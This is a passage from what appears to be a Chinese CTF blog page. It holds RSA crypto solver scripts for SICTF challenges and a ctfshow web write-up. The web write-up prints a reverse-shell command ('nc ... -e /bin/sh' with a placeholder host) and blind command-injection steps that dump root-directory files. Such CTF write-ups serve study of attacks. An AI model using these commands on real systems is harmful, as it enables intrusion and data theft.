1647307180399632857248867655836894968134457622987954781685664833951774981383914013420724637676787907498490619865488706542422141338754933476190313653530739822029700217857534243473680585150263523947891501341441371965435851479670882202992955935279933652356336270251591324623898094984119190752775236005057405257945038031382867511822173122001309505728526596893926445291712035117553637589190292816001770554129840326832888707541999454791653742647879694585329112697382151447923691770809327807665376014114552626285289291808032845544905356380497227622738746307685611140483875177839511922977657045680353723672792411661489242162646272105649970359134277499907207906149573299990033858943215801954126448693460102775418225293255402758159431943811872373682053160944887775375465971432320964554947377318554518275854303099420999992690990916801757184853847474379621177976926681977371922191722085164910430032177320954341986984523594583172470609743970245810969858512632597943721628165724329447516823159387734220282510185959768239630017162115072758419177056571781075148374822721899683720488356041096248563880547752710289151512607087038310649235610688255059182467964379544134070766646863815775576049106337955345150055151813028534690066771104188418296440067303355417210829440978858599306487361626723932883675404705319649877631289465547597225908934420304867048341698308940436377375588905463549199568800788130324653074398891097223958392703515180958466771395566567923630440881986781120062769327993137151783189811570714391264155060840731029466593405853721833971303821804104382800673631786729744779165371433211267361024896576031556979771007693215198547296582235167582106419779580693225211695215406540025468141235241168387527901851774993867055740692835931115312659500713701652905802357951993290979099170159167009106534001226859533836082801229997337966972579186548771169099646656172882424089451273021293821026173210665095782802709874946641962115525841325300318524665386511421662860490620819561338110623774842340380068922415609137358448899126553279894950604871889208579886778999174405582160576479554324208876082033912031737086248121899303730781498156597249803927142235444644481388064486155431912003641095674949903404176810866307571531389637794147871012904134653569388493652441432759092336752228939764110397029831387803943394811558386122839568158928461007578259968765727092577006588264867960486472014493774664081407186721351852883527145790575242285664659303948842228766554243966691396492391152581830022133814454196259968655735361775914705332258892954614272244452518449260489348504449204461418971768011384340273291232094176572232837038670467853897665877851434992557429017504229337778470080893449423405491607587635438331476572996201482633587271479001915768182336813417460145272910780420062773057289352127058606048428315185624554551172152106354445240590380140756355226376829443068190672329776832112173322011137862590548721676059398379694994522794474774534579546109677615257696703950497332824299576069196330271666459758430542051969093680846765661685489556479825015505460585577388300005030240514448617715276600874290664416888184557142542207029827016362686924883704397874129412267949416733492080843315519912943048041880665442664534980370689081266908497051077237188221752059058912835617635691061804481035908317765279937217591432632832678806430381325340000898958680468694182993189208039459712391492410123386884340504648296815916980264240229859574883155040793388439699245314010536014311134726579595932201351264754211113984594974123575279085420654342347792446273359397655783349850267895960713020361459104930811498666622216299579774939159380045958811891996366190154624989040001455252320159516822116133341010157165599727635333348456688307169980804760876207246783116588952529877373514768545007418968307885769960168050996962066803264260375707466369627458024513973771207018864983698407016663019106354023164759250846073414341438963394719456500998324900154652118420207057668806120330181700845296117532235012372135050553397046174401449323031309344766628888675704109715329046692002106076405553528413866402862565543443907259825033515101841485790388106868972724754988229771779715569516295419556055234476868558577442887306482605945053829666543946452255290321024138948999088611233226734197091325915223296133751626031378197131875533631358612215053149934608672729194446883476706267066475008836864936670808320239466055935088929279252129128009704233352664523535820092988950793050907265677092793104426094212209504897403359406325045852228354350509453013015487815230129380079713113632363881496974185547766115624580099624722897692297760495094913178120692467666707678647081180656345151015995338390986674404981831649353833607305738823436744297628382797810952028446046016233612873716789383675779820186248250486000672269630344269347652027789034023080859790238772676504723029078903218723114249502157501775936110552413022658586833869562215506206204712447588632398550497708640229614956652263449460598992811393334042395804931240940416629178335447861485028284981615219874331354750385150254017244750993573994159458909546341067039268159319391512934162794663414200907868505060542602841564239761181077333990423542820064315891665379550720216448942932714180923613869070005330476506812100063599659432570925437054287120906048730323556681557905787470647037629769660028387819741611799183349496549168370221978146678987457271259655273299546276899538032070218474555442304430064164467753804089753466882786069297036926063093020795423414152340563079346797084488827259011515774643776620378827875819192074121522712821147817374988804339999134520633699074448564057555026364304855373068414955699295158212425760345481057281658337956841137897162198027254556350868502178340964817530029135654659162400076087528650997151875596189190736466304722028587441680622878918057024286243448077104494316372739218635221411755498456912672491099154558604384574583302548226057069534004474532514444674565766058970748694657151540644416463532338966570743112669782840065402131461088637463019996192189423665651801811614499041923273110971446683450048861113332787126098622974613883291506736280588039145040361795192519576202306796277888696719887642051327259799873478040156450250036778305950744573270786882726162630115640020293415918210448873867037875790399234972055537649774407094382744621251926131880807765203843946682834221238903263352845265134368550124026502981782369374484091775137498831749984649699756860976525160646445060537001
+c = 25311588269686177955448734593829241225577179988164713941852977611031657483354358211703127234256857543045931490595235462694154500286504335321863566904591526587164297277540588019404183750093303030110155964308233155625979213391426577001127732161793532171930032372311485789800839135378584125843945003217786635500780784536181313697728354510921343049319891609423580951127082479154042124088536642353812516362473763243425336498681024731131013712158320926550826023277898283823992258572884077276506953901984370413493389421701244517177275694290580595883324705204426546600360091062972293159479880268240701929584137714053692704173792703744319619320692061092061615202753943135058204637610994232168818081462863915909261100211958674543647005416235222620606212841753586419836448681445654681389951211124603287962397164672343026391101395393442103086256726266031275710666309840451443110824175976964355109239201609721120961810198879456321855222352235065257082872600438604687617267718725588993464084147695037610145634237788526691386358596867368523164061114195245860062033244276270480267737617206612775486335779851309426638789250166900931784751600508190450785806340839297468432626354823268011108399699249876358363866293469899572158837757748629586492339783888456600259136387616777593894789302431752391447333278000811521062096467397501227651566498970779080811188805992370970942403208432494393387894197176720244315639559895616799551357601688597541585709039366190088117378880414928532937085490713336140523926983900188378021593225550131993528275166272215028510435690944582596557549068715312515919059333916941744937308255671959764859162487792658274812322891679161915480098864709106347357292015949882243095564999283630289876842913558415205967734452657944991350268108202225952952066459093168792825684626405271617613362070897142103054139806566495183172335794957308822648116537830567396971238329939142829563169355194093529211071160078683833491919940022871862059981346961003867620542620578917684687869682550269127226291011607064545739386850054846167307744022708831833252517778607796258598290908139274345221343651583618249287308738279011682960787460189183445095638164116734700624496711487227176740828397696295620232796356005136058517828311139839381424066302086111930635998143063033446131859852797958765199173807715541045956108285596958780742834805533223538366354327087736088500599094358107164689423572964793385788194218918919596478862097292477628426360333874314260108133339375942666508606311391805252966277961758108821946154428477616100004321457604879220523742427633323872953699931521980332026241531049474031438142792394628576016121322036294740176980189940853036679375845577017978783071015970829136676221389585848058189544793760570196797629432282672371000290840492119720433350192833648839794730598188620374416865232426658538841900897108162173580739323675324880778494924038982358349531848197090990541020708295116156624389135273650491811601011636903928586011504526431498652011548693157985029456398851189821020778958527809174433156243544030624341915713810661287037659586018768085470670240790942171506843637271442721823608266490364627429331023698199955218456371716269004979764982383921294842864121196124699402037204598504310969390789092001114319822852242500941141355281693725110460506548426263105213498404197519606615831672853931646583757742145492562101250546593997874586076926641241047317510838024042147508770595175718146175716833867781581245298658392175502069483979736336330731124942036757071709086638075284655589787868565023763734664219353940143820183318534640360506287779208468427268377183973501528333749816003855834863565394122448191029578528511650194632623989208637401008114422451686312319644054514944700566430912835340518601698767128195833704182657730566589247891277627101027106635732998136735398078858899384713118593668984773592904704131402905145754570091966901120411201405256435232063295790833161132002246279663161388421997242226907126829858922174709653627696146355472690262198127338971112610753839661677080463775112411884196230185877234066728564716929551607129141735155379529048300204700285511666205204686244751557147684338591300111406075976759988295937870045743031816067994768915303111125253664865369863586807234945352445045026501495849671447691502253489642657652848949102823407762108943161789244134119866441040670840037015617307056821150285453994199024947457774647253618512995677313792036106100497936654142008173389260345411854520383366800831542339243757421033121103167943520915885043698882609693007629591093225819727653240183003450339802857059736870645197609170799838610316307123146927966669912638227587517396282910946355194781275415343491170583392480153599086125374051844306869510079152461763122622668280249192047024784624692776244265874153473114993619019113474166958126841368545758693832786756946298833891033171752534079387364641021835311861509609494125593285947444939996542402774020507531158198766149282993994638607458820211163623309687149807339960007614766879688676462400606899851539023671152038536934433128973358637812907001112093086713949701646964777013925616637956114825918525229968119306607256312727518429074253193934915609865400118400124334806320033990630595454381780378123232633134565408152216410478497582716891919477755736223636583493709691482948793995974775520709337409910573358960632077245564017495103173982250506224927848890977671698731337737945862469303397352291579706358090437359126171980555387033997507170208063868788685780633727495158542911276981383764698030088894904043298340184342818716278091407356551940358010532738356144600648671870141201656260882560550096111259047730234565173017875969390130055742832375612379167064701421263006004472414998830886590121784525812803198481744263349186310137594023961272959521982892804372412802448375074058059953851751721276448647238818757245128139844126234490887064897176175605991477364838775902549049484485649550475857257115219540606931472558004890564503134870490140656624241401747198540715275804941032074573356860460172868340373583692584902872979221114982298050586685719887060873413850621645519128954022253850929825608263273096476942591333367968509790925478388960974334157155990587259664085903377635645971389261554405014491809856113962072321115329323751880850245450855429733690986687462514539793256111238991830404264833945950057548041347552265351912075406068254301589527368376552057750656888595867048015012255350060023438752477068307445956245683183096512267217891149812719686622381240260466772552889788641876064057960173837664029586196731436456574414559972320705400861271592462379875676277251086312872195716024719468847393778892154498344296554136868868732950910162390521996660833516010868267341539744299603050842530651780425947531816479566426165422123252285427076862067553260240357395991463485011778125635347076641337205162163658915958257879189951068432591492287483129944125287963913713736174143726754563437013760958618334477377727596918588685928884428267449422751775309153821164066157157127578931430789782791432466972743083256930846560916380022935439074194208587413499830348721004306047843916090382879427208653946874404416581482497419737465638158237340330822703573665318917667360471294611610224794247546701801044290825387969994925735165223021550294577211312086169077389985367351707099712483698243658870007261177946508698830792080087400145468466457013023648585707831661968993789151545051681008263293021078693138432668411562842904645661356499891588207831214182852485507569391094080770281546830762172075737108196782354642073491890672014845707320966391491467609280627047834838773416130380735074488364271149543425149101272213833983451690912775914099688310078028317868139895586469648241691434390559738020665790535748911667198341478329818172050103593169144077713081858968945277802911631514524770516773987691162846774892828407010262766598402873965272708201519043339930474621748065360132998861911090097210247744181877811558047691563490093112810880988416880859363631693862441291401344868362517958157134815632633152101164792211199872770004214575342556751954753067436057216989105115974894826691301734658752554796336087163153087013755182247902851847839867807219615044427616326518986674768302109569955218389569458769985874451273117138435546665024826358058600551523916808015505037962468350942106702503883112975634757971636535249998962164886704286732345711210362931312187319836001555348202695806282730945501510756659164231139623277954192087899140537284122009070763979073048837471984618684020674370221463294306239424220412900401460550783283591789801735401367473630854684306273273881688896021682911944793729874921181848098382943970467341811398482121657330781393699096796050290808604481724879698091852697163383826854575487201365106673196811573729247280577781500366763330567122007588833805912087009446499739562463428568952248234506507069953596589309728265145195922268165106056450388840269349409588020300011340940321969965833519126936472969929255823540027083032424724503173052044192907375974391257436211908641463947719594493311129179150043015816776680636855703407557636501711566215605658114055289137679940955
+e = 19458216662993202562182929756256684791318810848802754020883513588583377528821730559897870095442161189229950925325157413999927847684731484753811988111830295294129447423655650029218971567158117911790213848402209470536199246476182240248742771389082526603384625792117047996128232952372477895218147279573573322975526303267821446640338606290250958710008158544852602338088244940388562828263436457418528981476220691508040085291576643321726669065360399003917048894093458055139757991688086912143763420958307099065105543361779847689716282373299487102518794317683805758527645283956734672229827240143254092779918701447288342107763
+
+#************************************hint**************************************
+M = libnum.s2n(hint)
+P = getPrime(512)
+Q = getPrime(512)
+N = P * Q
+print(&quot;N=&quot; , N)
+E = 65537
+dp = (gmpy2.invert(E,(P-1)*(Q-1)))%(P-1)
+print(&quot;dp=&quot; , dp)
+ct = pow(M, E, N)
+print(&quot;ct=&quot; , ct)
+#N= 154243858720978602820118866455277758287334223654318945323956633685668127012462551649034724900534326698546179107853501584676890290935304784613676008667655919749627682648852472398117930471389759979432279103098572267738634433626627146280660185675121614094399255782089060202532182667463993275434746386786808729553
+#dp= 414447829724187823397808703878958757693775250832414113550357728233230359464880433113636330432984183165483109337095394192757735932571515450285102727598243
+#ct= 107353143319003715532284973064969905174389167949274067058206046773012002421251301189097709121034091973243342582216724329271495555062882075119176838856174054763892910473175610614629226628025470613930226188506099489500606701109022668507012376482339056160636468427364776216626364765166621843217027512464383836160
+</code></pre>
+<p>hint是dp泄露工具一把梭得到alpha&#x3D;8<br>带入原题中,上面的原题我直接带入alpha了<br>那么可以知道<br>n约等于(8^16) * (128^32) * (4096^2) *p^58<br><img src="https://img-blog.csdnimg.cn/582c5cfb41e24181ab56c23e8c622629.png" alt="在这里插入图片描述"><br>通过n算出p</p>
+<pre><code class="python]">from Crypto.Util.number import *
+import gmpy2
+import sys
+from sympy import *
+sys.set_int_max_str_digits(0)
+n=510598540378970007468346322989879190780475356832709189528874695730531468123747091318830966440138615736420891392158097533731041150162690662471483619765171875053776526546923686545162088172326434280369545887080098691661618888498451216122577703462656147845476260802989936275927468143618457014875124540773380472942489037761179303561650189545290190421786318533073909424735517884608967725919128200358535113829753453601297612782921831305721998858231417374167746154206561475003022801732102170674160043866579234096945753255309604584663823273990392197858273029361669185072049422597132579136784027822968387907216366150999438414498332890674564920800382005582891491049365978733797356415518435343495821039314228388769356638637099572998812062355774848959446125701462950655806332002764535951282449862140062574418031213788534096501985200284615865248974807525604893147298611402252296159828500266098282909607218395957805357667923653409828275804406466185333491486073920384298557332939701611488655278812282652143513835104674009767479927241052662403578967182673338296967573503287747778401579267126898937724971226916836862238412923209155792382534204896050548824028658237640251964366961727999178646613907934616655737902329568420682808750546571786374023614255135110482419627491157502417864563832543812083026753673687664854910877686333766643694031564516722983669199704788291656757271915091399977189663329054202997146978631991467923388119989473941572476162990901960011968892272676827771256008656450296183884491251752111424531449198118292179798490440493223653950102915889401116251591885909790869073018774674246846164536910633015902964911907187085243240032540938841961345835517368130042501382327926289017383981908729734129193302049155793436988510517701765733605569135643208447952662352778482137713239592896997102366230279153456455232519301534222340901671138239539845240151878610363390683459663471954623868659324304077587611084188341121303918876492043578883059738615210439439368338460631574255417822627815523601923537626576677004085017875860928802762176477815284840936951142176532768517728636562256240668409525184886142801802825451465440993457022771077957094228957592122319682216294509338262739872163482972508991702525289361105971574659126127296233247905505496525683817711366704746617027744889413904684867577081667137187623825349410229389484199608739864221035985277681307389939848405790294473878622092200837753161101695539947514614727699952200114544362051873938505591469240465379091377837297561323297393518152524513948294475770774872596601345526469590486037386767964812631618224527233850818909346007449756779707319609915127618828551910681421647307180399632857248867655836894968134457622987954781685664833951774981383914013420724637676787907498490619865488706542422141338754933476190313653530739822029700217857534243473680585150263523947891501341441371965435851479670882202992955935279933652356336270251591324623898094984119190752775236005057405257945038031382867511822173122001309505728526596893926445291712035117553637589190292816001770554129840326832888707541999454791653742647879694585329112697382151447923691770809327807665376014114552626285289291808032845544905356380497227622738746307685611140483875177839511922977657045680353723672792411661489242162646272105649970359134277499907207906149573299990033858943215801954126448693460102775418225293255402758159431943811872373682053160944887775375465971432320964554947377318554518275854303099420999992690990916801757184853847474379621177976926681977371922191722085164910430032177320954341986984523594583172470609743970245810969858512632597943721628165724329447516823159387734220282510185959768239630017162115072758419177056571781075148374822721899683720488356041096248563880547752710289151512607087038310649235610688255059182467964379544134070766646863815775576049106337955345150055151813028534690066771104188418296440067303355417210829440978858599306487361626723932883675404705319649877631289465547597225908934420304867048341698308940436377375588905463549199568800788130324653074398891097223958392703515180958466771395566567923630440881986781120062769327993137151783189811570714391264155060840731029466593405853721833971303821804104382800673631786729744779165371433211267361024896576031556979771007693215198547296582235167582106419779580693225211695215406540025468141235241168387527901851774993867055740692835931115312659500713701652905802357951993290979099170159167009106534001226859533836082801229997337966972579186548771169099646656172882424089451273021293821026173210665095782802709874946641962115525841325300318524665386511421662860490620819561338110623774842340380068922415609137358448899126553279894950604871889208579886778999174405582160576479554324208876082033912031737086248121899303730781498156597249803927142235444644481388064486155431912003641095674949903404176810866307571531389637794147871012904134653569388493652441432759092336752228939764110397029831387803943394811558386122839568158928461007578259968765727092577006588264867960486472014493774664081407186721351852883527145790575242285664659303948842228766554243966691396492391152581830022133814454196259968655735361775914705332258892954614272244452518449260489348504449204461418971768011384340273291232094176572232837038670467853897665877851434992557429017504229337778470080893449423405491607587635438331476572996201482633587271479001915768182336813417460145272910780420062773057289352127058606048428315185624554551172152106354445240590380140756355226376829443068190672329776832112173322011137862590548721676059398379694994522794474774534579546109677615257696703950497332824299576069196330271666459758430542051969093680846765661685489556479825015505460585577388300005030240514448617715276600874290664416888184557142542207029827016362686924883704397874129412267949416733492080843315519912943048041880665442664534980370689081266908497051077237188221752059058912835617635691061804481035908317765279937217591432632832678806430381325340000898958680468694182993189208039459712391492410123386884340504648296815916980264240229859574883155040793388439699245314010536014311134726579595932201351264754211113984594974123575279085420654342347792446273359397655783349850267895960713020361459104930811498666622216299579774939159380045958811891996366190154624989040001455252320159516822116133341010157165599727635333348456688307169980804760876207246783116588952529877373514768545007418968307885769960168050996962066803264260375707466369627458024513973771207018864983698407016663019106354023164759250846073414341438963394719456500998324900154652118420207057668806120330181700845296117532235012372135050553397046174401449323031309344766628888675704109715329046692002106076405553528413866402862565543443907259825033515101841485790388106868972724754988229771779715569516295419556055234476868558577442887306482605945053829666543946452255290321024138948999088611233226734197091325915223296133751626031378197131875533631358612215053149934608672729194446883476706267066475008836864936670808320239466055935088929279252129128009704233352664523535820092988950793050907265677092793104426094212209504897403359406325045852228354350509453013015487815230129380079713113632363881496974185547766115624580099624722897692297760495094913178120692467666707678647081180656345151015995338390986674404981831649353833607305738823436744297628382797810952028446046016233612873716789383675779820186248250486000672269630344269347652027789034023080859790238772676504723029078903218723114249502157501775936110552413022658586833869562215506206204712447588632398550497708640229614956652263449460598992811393334042395804931240940416629178335447861485028284981615219874331354750385150254017244750993573994159458909546341067039268159319391512934162794663414200907868505060542602841564239761181077333990423542820064315891665379550720216448942932714180923613869070005330476506812100063599659432570925437054287120906048730323556681557905787470647037629769660028387819741611799183349496549168370221978146678987457271259655273299546276899538032070218474555442304430064164467753804089753466882786069297036926063093020795423414152340563079346797084488827259011515774643776620378827875819192074121522712821147817374988804339999134520633699074448564057555026364304855373068414955699295158212425760345481057281658337956841137897162198027254556350868502178340964817530029135654659162400076087528650997151875596189190736466304722028587441680622878918057024286243448077104494316372739218635221411755498456912672491099154558604384574583302548226057069534004474532514444674565766058970748694657151540644416463532338966570743112669782840065402131461088637463019996192189423665651801811614499041923273110971446683450048861113332787126098622974613883291506736280588039145040361795192519576202306796277888696719887642051327259799873478040156450250036778305950744573270786882726162630115640020293415918210448873867037875790399234972055537649774407094382744621251926131880807765203843946682834221238903263352845265134368550124026502981782369374484091775137498831749984649699756860976525160646445060537001
+k=(8**16)*(128**32)*(4096**2)
+print(gmpy2.iroot(n//k,58)[0])
+</code></pre>
+<p>当报错<br><img src="https://img-blog.csdnimg.cn/d083cecb3aec46e9be856fd029729a09.png" alt="在这里插入图片描述"><br>考虑<br><img src="https://img-blog.csdnimg.cn/105a70e722f348bca115edfc5138bdd6.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d9fe0631f8ec45c5a441592a9dc3d7c9.png" alt="在这里插入图片描述"><br>但是这个p不是我们需要的p,这个p是在我们需要的p附件的<br>考虑爆破</p>
+<pre><code class="python">from Crypto.Util.number import *
+import gmpy2
+from sympy import *
+c = 25311588269686177955448734593829241225577179988164713941852977611031657483354358211703127234256857543045931490595235462694154500286504335321863566904591526587164297277540588019404183750093303030110155964308233155625979213391426577001127732161793532171930032372311485789800839135378584125843945003217786635500780784536181313697728354510921343049319891609423580951127082479154042124088536642353812516362473763243425336498681024731131013712158320926550826023277898283823992258572884077276506953901984370413493389421701244517177275694290580595883324705204426546600360091062972293159479880268240701929584137714053692704173792703744319619320692061092061615202753943135058204637610994232168818081462863915909261100211958674543647005416235222620606212841753586419836448681445654681389951211124603287962397164672343026391101395393442103086256726266031275710666309840451443110824175976964355109239201609721120961810198879456321855222352235065257082872600438604687617267718725588993464084147695037610145634237788526691386358596867368523164061114195245860062033244276270480267737617206612775486335779851309426638789250166900931784751600508190450785806340839297468432626354823268011108399699249876358363866293469899572158837757748629586492339783888456600259136387616777593894789302431752391447333278000811521062096467397501227651566498970779080811188805992370970942403208432494393387894197176720244315639559895616799551357601688597541585709039366190088117378880414928532937085490713336140523926983900188378021593225550131993528275166272215028510435690944582596557549068715312515919059333916941744937308255671959764859162487792658274812322891679161915480098864709106347357292015949882243095564999283630289876842913558415205967734452657944991350268108202225952952066459093168792825684626405271617613362070897142103054139806566495183172335794957308822648116537830567396971238329939142829563169355194093529211071160078683833491919940022871862059981346961003867620542620578917684687869682550269127226291011607064545739386850054846167307744022708831833252517778607796258598290908139274345221343651583618249287308738279011682960787460189183445095638164116734700624496711487227176740828397696295620232796356005136058517828311139839381424066302086111930635998143063033446131859852797958765199173807715541045956108285596958780742834805533223538366354327087736088500599094358107164689423572964793385788194218918919596478862097292477628426360333874314260108133339375942666508606311391805252966277961758108821946154428477616100004321457604879220523742427633323872953699931521980332026241531049474031438142792394628576016121322036294740176980189940853036679375845577017978783071015970829136676221389585848058189544793760570196797629432282672371000290840492119720433350192833648839794730598188620374416865232426658538841900897108162173580739323675324880778494924038982358349531848197090990541020708295116156624389135273650491811601011636903928586011504526431498652011548693157985029456398851189821020778958527809174433156243544030624341915713810661287037659586018768085470670240790942171506843637271442721823608266490364627429331023698199955218456371716269004979764982383921294842864121196124699402037204598504310969390789092001114319822852242500941141355281693725110460506548426263105213498404197519606615831672853931646583757742145492562101250546593997874586076926641241047317510838024042147508770595175718146175716833867781581245298658392175502069483979736336330731124942036757071709086638075284655589787868565023763734664219353940143820183318534640360506287779208468427268377183973501528333749816003855834863565394122448191029578528511650194632623989208637401008114422451686312319644054514944700566430912835340518601698767128195833704182657730566589247891277627101027106635732998136735398078858899384713118593668984773592904704131402905145754570091966901120411201405256435232063295790833161132002246279663161388421997242226907126829858922174709653627696146355472690262198127338971112610753839661677080463775112411884196230185877234066728564716929551607129141735155379529048300204700285511666205204686244751557147684338591300111406075976759988295937870045743031816067994768915303111125253664865369863586807234945352445045026501495849671447691502253489642657652848949102823407762108943161789244134119866441040670840037015617307056821150285453994199024947457774647253618512995677313792036106100497936654142008173389260345411854520383366800831542339243757421033121103167943520915885043698882609693007629591093225819727653240183003450339802857059736870645197609170799838610316307123146927966669912638227587517396282910946355194781275415343491170583392480153599086125374051844306869510079152461763122622668280249192047024784624692776244265874153473114993619019113474166958126841368545758693832786756946298833891033171752534079387364641021835311861509609494125593285947444939996542402774020507531158198766149282993994638607458820211163623309687149807339960007614766879688676462400606899851539023671152038536934433128973358637812907001112093086713949701646964777013925616637956114825918525229968119306607256312727518429074253193934915609865400118400124334806320033990630595454381780378123232633134565408152216410478497582716891919477755736223636583493709691482948793995974775520709337409910573358960632077245564017495103173982250506224927848890977671698731337737945862469303397352291579706358090437359126171980555387033997507170208063868788685780633727495158542911276981383764698030088894904043298340184342818716278091407356551940358010532738356144600648671870141201656260882560550096111259047730234565173017875969390130055742832375612379167064701421263006004472414998830886590121784525812803198481744263349186310137594023961272959521982892804372412802448375074058059953851751721276448647238818757245128139844126234490887064897176175605991477364838775902549049484485649550475857257115219540606931472558004890564503134870490140656624241401747198540715275804941032074573356860460172868340373583692584902872979221114982298050586685719887060873413850621645519128954022253850929825608263273096476942591333367968509790925478388960974334157155990587259664085903377635645971389261554405014491809856113962072321115329323751880850245450855429733690986687462514539793256111238991830404264833945950057548041347552265351912075406068254301589527368376552057750656888595867048015012255350060023438752477068307445956245683183096512267217891149812719686622381240260466772552889788641876064057960173837664029586196731436456574414559972320705400861271592462379875676277251086312872195716024719468847393778892154498344296554136868868732950910162390521996660833516010868267341539744299603050842530651780425947531816479566426165422123252285427076862067553260240357395991463485011778125635347076641337205162163658915958257879189951068432591492287483129944125287963913713736174143726754563437013760958618334477377727596918588685928884428267449422751775309153821164066157157127578931430789782791432466972743083256930846560916380022935439074194208587413499830348721004306047843916090382879427208653946874404416581482497419737465638158237340330822703573665318917667360471294611610224794247546701801044290825387969994925735165223021550294577211312086169077389985367351707099712483698243658870007261177946508698830792080087400145468466457013023648585707831661968993789151545051681008263293021078693138432668411562842904645661356499891588207831214182852485507569391094080770281546830762172075737108196782354642073491890672014845707320966391491467609280627047834838773416130380735074488364271149543425149101272213833983451690912775914099688310078028317868139895586469648241691434390559738020665790535748911667198341478329818172050103593169144077713081858968945277802911631514524770516773987691162846774892828407010262766598402873965272708201519043339930474621748065360132998861911090097210247744181877811558047691563490093112810880988416880859363631693862441291401344868362517958157134815632633152101164792211199872770004214575342556751954753067436057216989105115974894826691301734658752554796336087163153087013755182247902851847839867807219615044427616326518986674768302109569955218389569458769985874451273117138435546665024826358058600551523916808015505037962468350942106702503883112975634757971636535249998962164886704286732345711210362931312187319836001555348202695806282730945501510756659164231139623277954192087899140537284122009070763979073048837471984618684020674370221463294306239424220412900401460550783283591789801735401367473630854684306273273881688896021682911944793729874921181848098382943970467341811398482121657330781393699096796050290808604481724879698091852697163383826854575487201365106673196811573729247280577781500366763330567122007588833805912087009446499739562463428568952248234506507069953596589309728265145195922268165106056450388840269349409588020300011340940321969965833519126936472969929255823540027083032424724503173052044192907375974391257436211908641463947719594493311129179150043015816776680636855703407557636501711566215605658114055289137679940955
+e = 19458216662993202562182929756256684791318810848802754020883513588583377528821730559897870095442161189229950925325157413999927847684731484753811988111830295294129447423655650029218971567158117911790213848402209470536199246476182240248742771389082526603384625792117047996128232952372477895218147279573573322975526303267821446640338606290250958710008158544852602338088244940388562828263436457418528981476220691508040085291576643321726669065360399003917048894093458055139757991688086912143763420958307099065105543361779847689716282373299487102518794317683805758527645283956734672229827240143254092779918701447288342107763
+p = 8738451847920034708545076223890916870673609846272907766461427543964496627165332083226887998826268118278497034922368977393908949722110534853515503175453748
+while 1:
+    p1 = prevprime(p)
+    d = gmpy2.invert(e,p1-1)
+    m = pow(c,d,p1)
+    flag = long_to_bytes(m)
+    if b&quot;SICTF&quot; in flag:
+        print(flag)
+        break
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/dd54841d12c6429482628d21537a7353.png" alt="在这里插入图片描述"></p>
+<h1 id="XY"><a href="#XY" class="headerlink" title="XY"></a>XY</h1><p><img src="https://img-blog.csdnimg.cn/d0eeefdec4b44adc82e364fe9ac0f0e5.png" alt="在这里插入图片描述"><br>x^2 + y^2 &#x3D; n<br>求x和y<br>sage的函数直接求two_squares()</p>
+<pre><code class="sage">n =
+print(two_squares(n))
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/e9fb4c254cfd4637b2bd4d8350d79e86.png" alt="在这里插入图片描述"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/python/" style="color: #00bcd4">python</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/01/19/SICTF%E5%89%A9%E4%BD%99crypto%E5%A4%8D%E7%8E%B0/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2022/12/29/ctfshow%E4%B8%83%E5%A4%95%E6%9D%AFweb%E7%AD%BE%E5%88%B0wp/">
+        <h2 class="post-title">ctfshow七夕杯web签到wp</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2022/12/29
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>启动环境<br><img src="https://img-blog.csdnimg.cn/a354b59421cd414597188e6e488ba9b2.png" alt="在这里插入图片描述"><br>无回显命令执行<br>想到反弹shell<br>尝试写</p>
+<pre><code class="sh">nc xxx.xxx.xxx.xxx 9000 -e /bin/sh 
+</code></pre>
+<p>执行的时候发现太长<br>那试试能不能重定向写文件</p>
+<pre><code class="sh">ls &gt;1
+</code></pre>
+<p> <img src="https://img-blog.csdnimg.cn/ed4121199e3d4a8689c21f232f474f92.png" alt="在这里插入图片描述"><br>发现是可以的,访问api&#x2F;1 路径<br>发现确实是写入了<br>那么找找看flag位置,盲猜一手根目录</p>
+<pre><code class="sh">ls /&gt;1
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/74140a71e6e441b89bc68b87f4b9909d.png" alt="在这里插入图片描述"><br>确实在啊<br>那么试试能不能较短的语句给他带出来</p>
+<pre><code class="sh">nl /*&gt;1
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/f66b2cfe593841ed851cf1ab55951d61.png" alt="在这里插入图片描述"><br>刚好满足长度,多一个字符就执行失败</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+        </span>
+        
+    </div>
+    <a href="/2022/12/29/ctfshow%E4%B8%83%E5%A4%95%E6%9D%AFweb%E7%AD%BE%E5%88%B0wp/" class="go-post">阅读全文</a>
+</div>
+
+
+        <div class="page-current">
+    
+    <a class="page-num" href="/page/5/">
+        <i class="fa-solid fa-caret-left fa-fw"></i>
+    </a>
+    <a class="page-num" href="/">1</a>
+    <span class="page-omit">...</span>
+    
+    <span class="current">6</span>
+    
+    <a class="page-num" href="/page/7">7</a>
+    
+    
+    
+    
+    <a class="page-num" href="/page/7/">
+        <i class="fa-solid fa-caret-right fa-fw"></i>
+    </a>
+    
+</div>
+
+    </div>
+    
+    <div id="home-card">
+        <div id="card-style">
+    <div id="card-div">
+        <div class="avatar">
+            <img src="/images/Arcueid.jpg" alt="avatar" />
+        </div>
+        <div class="name">Arcueid</div>
+        <div class="description">
+            <p>Web + Crypto 苦手</p>
+
+        </div>
+        
+        
+    </div>
+</div>
+
+    </div>
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
